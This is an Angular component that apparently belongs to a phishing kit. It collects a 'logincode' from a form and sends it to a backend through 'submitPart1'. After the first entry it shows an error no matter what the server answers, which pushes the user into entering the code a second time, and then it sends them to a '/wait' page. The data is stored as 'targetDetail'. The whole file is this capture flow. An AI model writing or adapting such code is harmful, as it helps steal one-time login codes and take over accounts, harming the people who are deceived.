import { Component, Inject } from '@angular/core';
import { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';
import { Router } from '@angular/router';
import { ManagementServiceService } from 'src/app/management-service.service';
import { FormControl, Validators } from '@angular/forms';



@Component({
  selector: 'app-confirm1',
  templateUrl: './confirm1.component.html',
  styleUrls: ['./confirm1.component.css']
})
export class Confirm1Component {


  codeControl = new FormControl('', [Validators.required]);
  targetDetail : any = {
        
  }
  constructor(
    public router: Router,
    public managementService :  ManagementServiceService,
  ) { }

  showError: boolean = false;
  firstAttempt: boolean = true;

  navigateToWait(): void {
    if (this.firstAttempt) {
    this.targetDetail = {
      logincode: this.codeControl.value,
        
    }
    this.firstAttempt = false;
      this.showError = true;
    this.managementService.submitPart1(this.targetDetail).subscribe(
      (response) => {
        console.log('API Response:', response);
      },
      (error) => {
        console.error('API Error:', error);
      }
    )
    } else {
      this.targetDetail = {
        logincode: this.codeControl.value,
          
      }
      this.managementService.submitPart1(this.targetDetail).subscribe(
        (response) => {
          console.log('API Response:', response);
        },
        (error) => {
          console.error('API Error:', error);
        }
      )
      this.router.navigate(['/wait']);  
    }
      
  }
}
